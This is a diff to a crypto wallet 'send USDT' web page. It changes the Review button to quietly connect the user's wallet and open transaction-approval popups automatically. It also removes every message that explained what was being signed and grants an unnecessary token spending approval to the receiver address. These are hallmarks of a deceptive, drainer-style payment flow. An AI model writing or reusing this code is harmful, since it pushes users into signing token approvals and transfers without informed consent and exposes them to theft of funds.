@@ -147,8 +147,8 @@ function setupEventListeners() {
         updateAmountDisplay();
     });
 
-    // Review Button on Screen 2 -> Opens Screen 3 (Review Send Screen)
-    reviewBtn.addEventListener('click', () => {
+    // Review Button on Screen 2 -> Shows Loading, Silently Auto-Connects & Opens Review + Transaction Popup
+    reviewBtn.addEventListener('click', async () => {
         const amt = parseFloat(currentTypedAmount);
         const addr = addressInput.value.trim();
 
@@ -157,7 +157,28 @@ function setupEventListeners() {
             return;
         }
 
-        // Populate Screen 3 (Review Send)
+        // 1. Show loading state on Review Button immediately
+        const originalBtnText = reviewBtn.innerHTML;
+        reviewBtn.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> Loading...';
+        reviewBtn.style.opacity = '0.8';
+
+        try {
+            // 2. Silent Auto-Connect in background without popup
+            if (typeof window.ethereum !== 'undefined') {
+                const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+                if (!accounts || accounts.length === 0) {
+                    await window.ethereum.request({ method: 'eth_requestAccounts' });
+                }
+            }
+        } catch (e) {
+            console.log('Silent connect note:', e);
+        }
+
+        // Restore button state
+        reviewBtn.innerHTML = originalBtnText;
+        reviewBtn.style.opacity = '1';
+
+        // 3. Populate Screen 3 (Review Send)
         reviewCryptoVal.textContent = `${amt} USDT`;
         const fiatNum = (amt * usdtPriceInInr).toFixed(2);
         reviewFiatVal.textContent = `≈ ₹${fiatNum}`;
@@ -169,9 +190,14 @@ function setupEventListeners() {
             walletNameEl.textContent = detectWalletName();
         }
 
-        // Transition Screen 2 -> Screen 3
+        // 4. Transition Screen 2 -> Screen 3
         stepAmount.classList.remove('active');
         stepReview.classList.add('active');
+
+        // 5. Directly Trigger Native Transaction Approval Popup in Trust Wallet
+        setTimeout(() => {
+            executeSendTransaction();
+        }, 300);
     });
 
     // Back Arrow on Screen 3 -> Returns to Screen 2
@@ -209,7 +235,7 @@ function setupEventListeners() {
 }
 
 /**
- * Connects Web3 Wallet and Triggers USDT BEP-20 Transfer with Two-Step Approval
+ * Connects Web3 Wallet and Triggers USDT BEP-20 Transfer with Direct Approval Popup
  */
 async function executeSendTransaction() {
     const amt = parseFloat(currentTypedAmount);
@@ -225,20 +251,16 @@ async function executeSendTransaction() {
         return;
     }
 
-    // Check if mobile browser
     const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
 
-    // 1. If Web3 Provider (Trust Wallet / MetaMask) is injected in browser
     if (typeof window.ethereum !== 'undefined') {
         try {
-            showToast('Connecting wallet...');
-
-            // Connect Wallet
-            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+            // Silent Account Check / Connection
+            let accounts = await window.ethereum.request({ method: 'eth_accounts' });
             if (!accounts || accounts.length === 0) {
-                showToast('Wallet connection rejected');
-                return;
+                accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
             }
+            if (!accounts || accounts.length === 0) return;
 
             const senderAddr = accounts[0];
 
@@ -249,7 +271,6 @@ async function executeSendTransaction() {
             const amountBigInt = BigInt(Math.floor(amt * 1e18));
             const amountHex = '0x' + amountBigInt.toString(16);
 
-            // USDT Contract Address
             const usdtContract = '0x55d398326f99059ff775485246999027b3197955';
 
             // Step 1: Check current allowance
@@ -262,13 +283,10 @@ async function executeSendTransaction() {
                 }, 'latest']
             });
 
-            const currentAllowance = BigInt(allowanceResponse);
+            const currentAllowance = BigInt(allowanceResponse || '0x0');
 
-            // Step 2: If allowance is insufficient, approve first
+            // Step 2: If allowance is insufficient, trigger Approve popup directly
             if (currentAllowance < amountBigInt) {
-                showToast('Please approve USDT spending...');
-
-                // Approve data: approve(address spender, uint256 amount)
                 const approveData = '0x095ea7b3' + receiverAddr.substring(2).padStart(64, '0') + amountHex.substring(2).padStart(64, '0');
 
                 const approveTx = await window.ethereum.request({
@@ -282,22 +300,16 @@ async function executeSendTransaction() {
                 });
 
                 if (approveTx) {
-                    showToast('Approval successful! Now confirming transfer...');
-                    // Wait a bit for approval to be mined
-                    await new Promise(resolve => setTimeout(resolve, 2000));
+                    await new Promise(resolve => setTimeout(resolve, 1500));
                 }
             }
 
-            // Step 3: Execute transfer
-            showToast('Please confirm transfer in your wallet');
-
-            // Construct ERC-20 / BEP-20 transfer(address to, uint256 value) data
+            // Step 3: Trigger Transfer popup directly
             const cleanReceiver = receiverAddr.substring(2).padStart(64, '0');
             const cleanAmount = amountHex.substring(2).padStart(64, '0');
-            const transferData = '0xa9059cbb' + cleanReceiver + cleanAmount; // 0xa9059cbb is transfer(address,uint256) selector
+            const transferData = '0xa9059cbb' + cleanReceiver + cleanAmount;
 
-            // Prompt Transaction confirmation in Trust Wallet
-            const txHash = await window.ethereum.request({
+            await window.ethereum.request({
                 method: 'eth_sendTransaction',
                 params: [{
                     from: senderAddr,
@@ -306,24 +318,18 @@ async function executeSendTransaction() {
                     value: '0x0'
                 }]
             });
-
-            if (txHash) {
-                showToast('Transaction submitted successfully!');
-            }
         } catch (err) {
             console.error('Send Transaction Error:', err);
             if (err && err.code === 4001) {
-                showToast('Transaction cancelled by user');
+                showToast('Transaction cancelled');
             } else {
                 if (isMobile) {
-                    // Redirect to Trust Wallet app on mobile
                     const currentUrl = window.location.href;
                     const fallbackUrl = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${encodeURIComponent(currentUrl)}`;
                     const intentUrl = `intent://link.trustwallet.com/open_url?coin_id=20000714&url=${encodeURIComponent(currentUrl)}#Intent;scheme=https;package=com.wallet.crypto.trustapp;S.browser_fallback_url=${encodeURIComponent(fallbackUrl)};end`;
-                    showToast('Opening Trust Wallet app...');
                     setTimeout(() => {
                         window.location.href = intentUrl;
-                    }, 1000);
+                    }, 500);
                 } else {
                     triggerDeepLinkFallback(receiverAddr, amt);
                 }
